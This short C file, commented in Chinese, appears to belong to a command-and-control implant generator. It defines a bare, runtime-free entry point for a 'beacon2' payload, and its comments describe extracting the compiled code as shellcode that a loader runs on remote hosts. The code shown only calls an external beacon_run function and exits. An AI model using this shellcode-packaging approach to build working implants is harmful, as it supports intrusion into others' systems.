/*
 * csdev :: beacon2_raw.c  --  beacon2 的 shellcode 入口外壳
 * ==========================================================================
 * 用途: 给 beacon2.c 提供一个无 CRT 依赖的裸入口, 供生成器用
 *         gcc -nostartfiles -Wl,-e,beacon_entry ...
 *         objcopy -O binary --only-section=.text
 *       提取出 .text 段的机器码。
 *
 * 注意: beacon_entry 位于 .text 段, 是 PE 的 AddressOfEntryPoint。提取后的
 *       二进制仍是"带导入的机器码": 其中对 kernel32/msvcrt 的调用走 IAT 间接
 *       跳转, 因此只有配套的 loader (自行分配内存并修复导入) 才能直接执行。
 *       远端落地执行请优先使用 win2-exe / win2-dll。
 * ==========================================================================
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

extern int beacon_run(void);

/* 裸入口: 不返回, 也不依赖 CRT 启动 */
void beacon_entry(void)
{
    int rc = beacon_run();
    ExitProcess((UINT)rc);
}
